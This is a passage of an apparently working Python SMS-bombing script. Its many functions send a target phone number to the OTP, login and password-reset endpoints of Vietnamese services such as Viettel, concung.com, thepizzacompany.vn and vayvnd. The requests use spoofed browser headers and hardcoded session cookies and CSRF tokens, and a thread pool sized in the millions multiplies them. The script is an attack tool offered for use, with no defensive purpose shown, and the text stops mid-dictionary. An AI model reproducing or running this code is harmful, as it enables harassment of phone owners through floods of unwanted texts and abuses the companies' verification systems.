import time
thanhcong=0
thatbai=0
#import
from pystyle import Colorate,Colors,Col,Center
import hashlib
import random,re,sys
import string
import urllib.parse
import json
import requests
import sys
from bs4 import BeautifulSoup
import requests
import random
import json
import string
import time
from concurrent.futures import ThreadPoolExecutor
import os,sys
import random, string
import requests, json
import inspect
import time, datetime
import random, string
import requests, json

from concurrent.futures import ThreadPoolExecutor
#bỏ qua chứng chỉ ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))
def so(length):
    return ''.join(random.choice(string.digits) for _ in range(length))
def generate_random(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
def generate_imei():
    return ''.join(random.choice(string.digits) for _ in range(15))
def Random_string(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return Random_string(8)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(12)
def get_TOKEN():
    return Random_string(22)+':'+Random_string(9)+'-'+Random_string(20)+'-'+Random_string(12)+'-'+Random_string(7)+'-'+Random_string(7)+'-'+Random_string(53)+'-'+Random_string(9)+'_'+Random_string(11)+'-'+Random_string(4)
def Random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
mail = generate_random(10)+'@gmail.com'
to=generate_random(53)+'-'+generate_random(86)+'-'+generate_random(121)+'_'+generate_random(2)+'-'+generate_random(94)+'-'+generate_random(3)+'_'+generate_random(9)+'-'+generate_random(15)+'_'+generate_random(17)+'-'+generate_random(39)+'_'+generate_random(85)+'_'+generate_random(34),
threading = ThreadPoolExecutor(max_workers=int(10000000))
from colorama import Fore
thatbai=0
day=0
status='ACTIVE'
key = 5
ngay = 0
def sms0(phone):
    global thanhcong
    cookies = {
        'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
        'tel': phone,
    }

    headers = {
        'Host': 'kavaycash.com',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://kavaycash.com/',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'Cookie': 'csrftoken=jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7; tel=0357497741',
    }

    response = requests.get('https://kavaycash.com/verification/', cookies=cookies, headers=headers)
    thanhcong+=1
def sms1(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'UrWHpav-jlIIAkZIKfuHiWzvo3q',
        '_ym_uid': '1690890718761379945',
        '_ym_d': '1693615052',
        '_fbp': 'fb.1.1699102383332.1544435954',
        '_gcl_aw': 'GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
        '_gcl_au': '1.1.667368353.1703856886',
        '_ga_P2783EHVX2': 'GS1.1.1703856890.5.0.1703856890.60.0.0',
        '_ym_isad': '1',
        '_ga': 'GA1.2.1456721416.1693615049',
        '_gid': 'GA1.2.84320069.1703856892',
        '_gac_UA-151110385-1': '1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
        '_ym_visorc': 'w',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=UrWHpav-jlIIAkZIKfuHiWzvo3q; _ym_uid=1690890718761379945; _ym_d=1693615052; _fbp=fb.1.1699102383332.1544435954; _gcl_aw=GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _gcl_au=1.1.667368353.1703856886; _ga_P2783EHVX2=GS1.1.1703856890.5.0.1703856890.60.0.0; _ym_isad=1; _ga=GA1.2.1456721416.1693615049; _gid=GA1.2.84320069.1703856892; _gac_UA-151110385-1=1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _ym_visorc=w',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'login': phone,
        'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
    if "true" in response.text:
            thanhcong +=1
    else:
            thatbai+=1
def sms2(phone):
    global thanhcong
    headers = {
        'authority': 'kingme.pro',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
        'dnt': '1',
        'origin': 'https://kingme.pro',
        'referer': 'https://kingme.pro/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data)
    thanhcong+=1
def sms3(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'vietteltelecom.vn','Connection': 'keep-alive','X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I','User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Accept': 'application/json, text/plain, */*','Referer': 'https://vietteltelecom.vn/dang-nhap',}
    data = {'phone': phone,'type': ''}
    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers)
    result = response.json()
    thanhcong+=1
def sms5(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
    response = requests.get('https://viettel.vn/dang-ky', headers=headers)
    token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
    data = {'msisdn': phone}
    response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers)
    result = response.json()
    thanhcong+=1
#sms 7


#sms 10
def sms7(phone):
    global thanhcong
    global thatbai
    cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF','__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1','XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',}
    headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
    json_data = {'phone': phone,'type': '',}
    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms11(phone):
    global thanhcong
    global thatbai
    cookies = {
        'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog',
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D',
        '_ga': 'GA1.1.1223576462.1703858206',
        '__utma': '65249340.1223576462.1703858206.1703858250.1703858250.1',
        '__utmc': '65249340',
        '__utmz': '65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
        '__utmt': '1',
        '_gcl_au': '1.1.854737399.1703858251',
        '_ga_DFG3FWNPBM': 'GS1.1.1703858205.1.1.1703858365.60.0.0',
        '__utmb': '65249340.2.10.1703858250',
        '__admUTMtime': '1703858368',
        '_tt_enable_cookie': '1',
        '_ttp': 'FLrVXJT5FMP_B9az47LH6-P6_GD',
        '_ga_BBD6001M29': 'GS1.1.1703858371.1.0.1703858371.60.0.0',
        '_fbp': 'fb.1.1703858371624.505444992',
        'dtdz': '39b60b4b-5c1c-40f7-a1fa-1775072dd497',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        'Srv': 'cc204|ZY7Qz|ZY7QH',
    }

    headers = {
        'authority': 'concung.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=j7jhajmp8628ho9d98bckrhkog; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D; _ga=GA1.1.1223576462.1703858206; __utma=65249340.1223576462.1703858206.1703858250.1703858250.1; __utmc=65249340; __utmz=65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; _gcl_au=1.1.854737399.1703858251; _ga_DFG3FWNPBM=GS1.1.1703858205.1.1.1703858365.60.0.0; __utmb=65249340.2.10.1703858250; __admUTMtime=1703858368; _tt_enable_cookie=1; _ttp=FLrVXJT5FMP_B9az47LH6-P6_GD; _ga_BBD6001M29=GS1.1.1703858371.1.0.1703858371.60.0.0; _fbp=fb.1.1703858371624.505444992; dtdz=39b60b4b-5c1c-40f7-a1fa-1775072dd497; __iid=; __iid=; __su=0; __su=0; Srv=cc204|ZY7Qz|ZY7QH',
        'dnt': '1',
        'origin': 'https://concung.com',
        'referer': 'https://concung.com/dang-nhap.html',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
        'classAjax': 'AjaxLogin',
        'methodAjax': 'sendOtpLogin',
        'customer_phone': phone,
        'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
        'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3',
        'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data)
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1
def sms14(phone):
    global thanhcong
    global thatbai
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'DNT': '1',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms15(phone):
    global thanhcong
    global thatbai
    headers = {
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
    if '"status":true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms18(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    if 'INVALID' in response.text:
        thatbai+=1
    else:
        thanhcong+=1
def sms21(phone):
    global thanhcong
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
    thanhcong+=1


def sms30(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gcl_au': '1.1.612062991.1693832247',
        '_ga': 'GA1.2.2100968570.1693832247',
        '_gid': 'GA1.2.823438155.1693832247',
        '_tt_enable_cookie': '1',
        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
    }

    headers = {
        'authority': 'thepizzacompany.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.612062991.1693832247; _ga=GA1.2.2100968570.1693832247; _gid=GA1.2.823438155.1693832247; _tt_enable_cookie=1; _ttp=8QojcD2E-4ZWQyk38eZM5QTGEw2; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus; .Nop.Customer=ba54ce0a-13e1-453c-8363-88bf017b8dcf; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
        'dnt': '1',
        'origin': 'https://thepizzacompany.vn',
        'referer': 'https://thepizzacompany.vn/Otp',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
    }

    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def sms32(phone):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://www.tiencash.com',
        'Referer': 'https://www.tiencash.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'deviceInfo': '{"operationSys":"","channel":null,"isMobile":"0","navigatorInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","screenHeight":768,"screenWidth":1366}',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'token': 'null',
    }

    data = {
        'phone': phone,
        'sign': '67d44dda-b29f-48a4-9830-67121bc618f8',
    }

    response = requests.post('https://api.tiencash.com/v1/verify/sms/send', headers=headers, data=data)
def sms34(phone):
    global thanhcong
    headers = {
        'Host': 'api.cashbar.tech',
        # 'content-length': '40',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.cashbar.tech',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.cashbar.tech/',
        # 'accept-encoding': 'gzip, deflate',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': phone,
        'type': '2',
        'ctype': '1',
        'chntoken': '',
    }

    response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data)
def sms36(phone):
    global thanhcong
    global thatbai
    link=  'https://topenland.com/_next/data/vDnYyjJ7yIDCaHNQ78kco/vi/sign-up/verify-otp.json?phoneNumber='+phone
    requests.post(link)
    thanhcong+=1
def sms38(phone):
  global thanhcong
  global thatbai
  def random_string(length):
      import random
      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result = ""
      for _ in range(length):
          result += random.choice(characters)
      return result
  alo=random_string(8)
  ten=random_string(4)
  phone = '0' + phone
  phone = phone.replace('00','')
  phone12 = '+84' + phone
  cookies = {'ads': 'www.google.com','refcode': '746','time_referer': '1689061704','kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5','kvas-uuid-d': '1686469706132','gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1','gkvas-uuid-d': '1686469706134','kv-session': '94e736d4-493e-4656-9a6a-266817374182','_hjFirstSeen': '1','_hjIncludedInSessionSample_563959': '1','_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==','_gid': 'GA1.2.1638977009.1686469708','_tt_enable_cookie': '1','_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd','_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','source_referer': 